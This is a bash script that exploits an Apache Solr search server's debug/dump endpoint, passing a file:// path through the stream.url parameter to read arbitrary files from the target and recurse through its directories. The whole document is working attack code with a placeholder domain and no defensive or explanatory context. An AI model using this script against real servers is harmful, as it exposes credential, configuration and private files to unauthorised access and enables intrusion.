#!/bin/bash

function callCurl() {

    local START="$1"
    local DOMAIN="$2"
    #globalsearch is a core, change this for the result of https://$DOMAIN/solr/#/~cores/
    response=$(curl -ks "https://$DOMAIN/solr/globalsearch/debug/dump?stream.url=file://$START&param=ContentStream" )
    #echo "$response"
    status=$(echo "$response"|grep status|awk -F':' '{print $2}'|tr -d ',')
    #echo "$status"
    if [[ "$status" == "0" ]]; then
        #echo "OK"
        content=$(echo "$response"| grep 'stream"' |awk -F':"' '{print $2}' | tr -d '"' | tr -d '}]'|tr -d ',')
        numspaces=$(echo "$content"  |awk '{print gsub("[ ]",""); exit}')
        #echo "spaces $numspaces"
        if [[ "$numspaces" == "0" ]];then
            #it's a folder let's recurse to $START
            ARRAY=( $(echo $content| sed 's/\\n/\n/g') )  
            for i in "${ARRAY[@]}"; do
              echo "$START/$i"
                callCurl "$START/$i" $DOMAIN
            done
        else
            #it's a file.just display content"
            echo $content |sed 's/\\n/\n/g'
            echo "----------------------------------"
        fi
    fi
    if [[ "$status" == "500" ]]; then
        echo "Access Denied"
    fi
}

DOMAIN="test.domain.tld"
START="$1"
callCurl "$START" "$DOMAIN"
